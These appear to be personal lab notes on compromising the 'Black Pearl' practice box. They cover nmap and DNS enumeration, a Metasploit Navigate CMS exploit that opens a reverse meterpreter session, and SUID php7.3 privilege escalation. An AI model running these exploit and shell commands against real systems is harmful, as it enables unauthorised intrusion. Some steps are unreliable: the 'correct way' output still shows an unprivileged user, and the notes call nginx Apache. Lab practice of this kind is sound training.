

Notes 



```
kali@kali ~> nmap -sC -sV -p- -T5 10.0.2.154
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-24 15:30 EST
Nmap scan report for 10.0.2.154
Host is up (0.00072s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

- 22 SSH
	- `OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)`
- 53 DNS
	- `bind.version: 9.11.5`
- 80 Apache
	- `nginx 1.14.2`



## DNS


```
kali@kali ~ [1]> dig any 10.0.2.154

; <<>> DiG 9.19.21-1-Debian <<>> any 10.0.2.154
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 3812
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1220
; COOKIE: 7005d8853eb90607d9d4705365da5619bb2ef7510497c07a (good)
;; QUESTION SECTION:
;10.0.2.154.                    IN      ANY

;; AUTHORITY SECTION:
.                       7171    IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2024022401 1800 900 604800 86400

;; Query time: 20 msec
;; SERVER: 192.168.100.1#53(192.168.100.1) (TCP)
;; WHEN: Sat Feb 24 15:48:30 EST 2024
;; MSG SIZE  rcvd: 142

```


### NSLOOKUP
```
kali@kali ~> nslookup
> server 10.0.2.154
Default server: 10.0.2.154
Address: 10.0.2.154#53
> 10.0.2.154
** server can't find 154.2.0.10.in-addr.arpa: NXDOMAIN
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = blackpearl.tcm.
> exit
```


### dns-RECON (was sussed out here)

```
kali@kali ~> dnsrecon -r 10.0.2.0/24 -n 10.0.2.154 -d blob
[*] Performing Reverse Lookup from 10.0.2.0 to 10.0.2.255
[+] 0 Records Found
kali@kali ~> dnsrecon -r 127.0.0.1/24 -n 10.0.2.154 -d blob
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found

```


now lets circle back to the website


![[Black pearl-20240225010446613.webp|1064]]



``

```
use exploit/multi/http/navigate_cms_rce
msf6 > 
msf6 > use exploit/multi/http/navigate_cms_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/navigate_cms_rce) > show options

Module options (exploit/multi/http/navigate_cms_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                         /basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/navigate_cms_rce) > set RHOSTS blackpearl.tcm
RHOSTS => blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (39927 bytes) to 10.0.2.154
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.154:35256) at 2024-02-24 16:25:51 -0500

meterpreter > 

```



```

```
# Mistakes


1 - use a safe wordlist
2 - understand the primary binary better before jumping onto the exploitation meaning, is it in the path?, can you read it?, write? these questions dont matter but the point of this is to think to look and understanding:
3 - dont just spam the commands, look at what applies to you and then use it



2.
```
meterpreter > shell
Process 27312 created.
Channel 7 created.
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
---s--s--x 1 www-data www-data 4777720 Feb 24 17:41 /var/www/blackpearl.tcm/navigate/php
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 4777720 Feb 13  2021 /usr/bin/php7.3    <---------------------  remember PHP7.3 NEEDS TO BE REFERENCED AS PHP7.3
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd

```




3.Mistake made 
```
www-data@blackpearl:/var/tmp$ CMD="/bin/sh"
CMD="/bin/sh"
www-data@blackpearl:/var/tmp$ sudo php -r "system('$CMD');"
sudo php -r "system('$CMD');"
bash: sudo: command not found
www-data@blackpearl:/var/tmp$ export CMD="id"
export CMD="id"
www-data@blackpearl:/var/tmp$ php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
<lose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@blackpearl:/var/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


Mistake 2 & 3
```
./php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"    <--------------------- YOU DIDNT REFERENCE THE PATH!!!!
id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 

```


```
/usr/bin/php -r "pcntl_exec('/bin/sh', ['-p']);"     <------------------------   YOU DIDNT REFERENCE THE CORRECT VERSION!!!!
id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```



THE CORRECT WAY!!!

```
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"     <------------------------   YOU DIDNT REFERENCE THE CORRECT VERSION!!!!
id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```
